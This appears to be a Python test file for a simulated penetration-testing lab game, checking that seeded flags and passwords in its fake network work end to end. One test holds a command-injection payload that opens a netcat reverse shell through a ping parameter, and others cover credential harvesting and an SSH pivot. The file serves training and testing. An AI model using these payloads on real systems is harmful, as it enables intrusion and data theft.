import base64
import unittest

from omnisploit.engine import lab
from omnisploit.engine.world import World
from omnisploit.shell.shell import Shell


def run(sh, line):
    out = sh.run_line(line)
    o = b"".join(d for d, e in out.chunks if not e).decode(errors="replace")
    e = b"".join(d for d, e in out.chunks if e).decode(errors="replace")
    return o, e


class SecretsHelperTests(unittest.TestCase):
    def test_none_seed_returns_the_fixed_defaults(self):
        s = lab._secrets(None)
        self.assertEqual(s["deploy_pass"], lab.DEPLOY_PASS)
        self.assertEqual(s["admin_pass"], lab.ADMIN_PASS)
        self.assertEqual(s["staff_pass"], lab.STAFF_PASS)
        self.assertEqual(s["ticket"], lab.TICKET)
        self.assertEqual(s["flag_admin"], lab.FLAG_ADMIN)
        self.assertEqual(s["flag_vhost"], lab.FLAG_VHOST)
        self.assertEqual(s["flag_ctl"], lab.FLAG_CTL)
        self.assertEqual(s["flag_wwwdata"], lab.FLAG_WWWDATA)
        self.assertEqual(s["flag_pivot"], lab.FLAG_PIVOT)

    def test_same_seed_is_deterministic(self):
        self.assertEqual(lab._secrets(7), lab._secrets(7))

    def test_different_seeds_differ_in_every_field(self):
        a, b = lab._secrets(1), lab._secrets(2)
        for key in a:
            self.assertNotEqual(a[key], b[key], key)

    def test_seeded_secrets_differ_from_the_fixed_defaults(self):
        s = lab._secrets(42)
        for key, default in lab._DEFAULT_SECRETS.items():
            self.assertNotEqual(s[key], default, key)

    def test_flags_look_like_flags(self):
        s = lab._secrets(99)
        for key in ("flag_admin", "flag_vhost", "flag_ctl", "flag_wwwdata", "flag_pivot"):
            self.assertTrue(s[key].startswith("FLAG{") and s[key].endswith("}"))
        self.assertEqual(len({s["flag_admin"], s["flag_vhost"], s["flag_ctl"], s["flag_wwwdata"], s["flag_pivot"]}), 5)


class WorldWiringTests(unittest.TestCase):
    def test_default_world_uses_fixed_secrets(self):
        w = World()
        self.assertEqual(w.net.secrets, lab._DEFAULT_SECRETS)

    def test_seeded_world_uses_matching_secrets(self):
        w = World(flag_seed=123)
        self.assertEqual(w.net.secrets, lab._secrets(123))

    def test_two_worlds_with_the_same_seed_match(self):
        self.assertEqual(World(flag_seed=5).net.secrets, World(flag_seed=5).net.secrets)


class NetworkEndToEndTests(unittest.TestCase):
    def setUp(self):
        self.w = World(flag_seed=321)
        self.sh = Shell(self.w)
        self.secrets = self.w.net.secrets

    def test_deploy_password_from_backup_notes_matches_ssh_login(self):
        o, _ = run(self.sh, "curl -s intranet/backup/deploy-notes.txt")
        self.assertIn(self.secrets["deploy_pass"], o)
        self.assertNotIn("Winter2026!", o)
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, self.secrets["deploy_pass"])
        self.assertIn("deploy@intranet", self.sh.prompt())
        run(self.sh, "exit")

    def test_admin_console_flag_and_credentials(self):
        auth = base64.b64encode(f"admin:{self.secrets['admin_pass']}".encode()).decode()
        o, _ = run(self.sh, f'curl -s -H "Authorization: Basic {auth}" intranet/admin/')
        self.assertIn(self.secrets["flag_admin"], o)
        self.assertNotIn(lab.FLAG_ADMIN, o)
        bad, _ = run(self.sh, "curl -s -u admin:s3cretadmin intranet/admin/")
        self.assertNotIn(self.secrets["flag_admin"], bad)

    def test_vhost_flag_on_the_hr_site(self):
        o, _ = run(self.sh, 'curl -s --resolve hr.brightside.lab:80:10.10.0.10 http://hr.brightside.lab/')
        self.assertIn(self.secrets["flag_vhost"], o)
        self.assertNotIn(lab.FLAG_VHOST, o)

    def test_staff_login_and_ticket_number(self):
        run(self.sh, "curl -s -c /tmp/c -b /tmp/c "
                      f"-d user=staff -d pass={self.secrets['staff_pass'].replace('#', '%23').replace('!', '%21')} "
                      "intranet/login > /dev/null")
        o, _ = run(self.sh, "curl -s -b /tmp/c intranet/portal")
        self.assertIn(f"Ticket {self.secrets['ticket']}", o)

    def test_ctl_flag_over_the_bctl_service(self):
        o, _ = run(self.sh, 'printf "FLAG\\r\\n" | nc files 9999')
        self.assertIn(self.secrets["flag_ctl"], o)
        self.assertNotIn(lab.FLAG_CTL, o)

    def test_wwwdata_flag_via_revshell(self):
        run(self.sh, "nc -lvnp 4444 &")
        run(self.sh, "curl -s 'http://intranet:8080/ping?host=127.0.0.1;nc 10.10.0.2 4444 -e /bin/bash'")
        run(self.sh, "fg %1")
        o, _ = run(self.sh, "cat /var/www/.secret.txt")
        run(self.sh, "exit")
        self.assertIn(self.secrets["flag_wwwdata"], o)

    def test_pivot_flag_on_the_vault_host(self):
        run(self.sh, "ssh -o StrictHostKeyChecking=no deploy@intranet")
        run(self.sh, self.secrets["deploy_pass"])
        run(self.sh, "ssh -o StrictHostKeyChecking=no -i ~/.ssh/vault_key ops@vault")
        o, _ = run(self.sh, "cat /home/ops/flag.txt")
        self.assertIn(self.secrets["flag_pivot"], o)
        run(self.sh, "exit")
        run(self.sh, "exit")


class WebenumMissionWithSeedTests(unittest.TestCase):
    def setUp(self):
        self.w = World(flag_seed=321)
        self.sh = Shell(self.w)
        run(self.sh, "mkdir ~/workspace")
        self.secrets = self.w.net.secrets

    def completed(self):
        self.w.missions.evaluate()
        return list(self.w.missions.completed)

    def test_webenum_completes_with_seeded_secrets_not_fixed_ones(self):
        run(self.sh, 'curl -s intranet/robots.txt | grep -o "Disallow: [^ ]*" | sed "s/Disallow: //" > ~/workspace/disallowed.txt')
        run(self.sh, "curl -s intranet/backup/deploy-notes.txt | grep -oE '[A-Za-z0-9]+[0-9]+!' > ~/workspace/deploy-password.txt")
        auth = base64.b64encode(f"admin:{self.secrets['admin_pass']}".encode()).decode()
        run(self.sh, f'curl -s -H "Authorization: Basic {auth}" intranet/admin/ | grep -o "FLAG{{[a-z0-9]*}}" > ~/workspace/admin-flag.txt')
        run(self.sh, "curl -s -c /tmp/c -b /tmp/c "
                      f"-d user=staff -d pass={self.secrets['staff_pass'].replace('#', '%23').replace('!', '%21')} "
                      "intranet/login > /dev/null")
        run(self.sh, "curl -s -b /tmp/c intranet/portal | grep -o 'Ticket [0-9]*' | grep -o '[0-9]*' > ~/workspace/ticket.txt")
        run(self.sh, 'curl -s --resolve hr.brightside.lab:80:10.10.0.10 http://hr.brightside.lab/ | '
                      'grep -o "FLAG{[a-z0-9]*}" > ~/workspace/vhost-flag.txt')
        self.assertEqual(self.completed(), ["webenum"])
